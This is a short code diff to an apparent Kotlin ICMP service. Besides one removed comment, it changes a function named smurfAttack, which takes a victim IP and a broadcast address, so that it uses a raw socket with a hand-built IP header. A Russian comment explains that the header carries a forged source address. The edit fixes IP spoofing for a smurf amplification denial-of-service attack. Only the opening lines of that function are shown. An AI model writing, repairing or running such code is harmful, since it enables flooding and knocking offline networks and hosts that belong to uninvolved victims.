@@ -119,7 +119,6 @@ class IcmpService : AutoCloseable {
 
     private fun flushSocket() {
         val buffer = Memory(65536)
-        // Только неблокирующее чтение, иначе на Linux виснет намертво!
         while (true) {
             val read = net.recvfrom(socket, buffer, buffer.size().toInt(), dontWaitFlag, null, IntByReference(0))
             if (read <= 0) break
@@ -185,7 +184,8 @@ class IcmpService : AutoCloseable {
     }
 
     fun smurfAttack(victimIp: String, broadcastIp: String, count: Int = 10) {
-        val smurfSocket = net.socket(NativeNet.AF_INET, NativeNet.SOCK_RAW, NativeNet.IPPROTO_ICMP)
+        // IPPROTO_RAW (255) отдает ядру команду взять наш готовый заголовок IP с поддельным адресом
+        val smurfSocket = net.socket(NativeNet.AF_INET, NativeNet.SOCK_RAW, NativeNet.IPPROTO_RAW)
         val one = Memory(4).apply { setInt(0, 1) }
         net.setsockopt(smurfSocket, net.getIpProtoIp(), net.getIpHdrIncl(), one, 4)
         
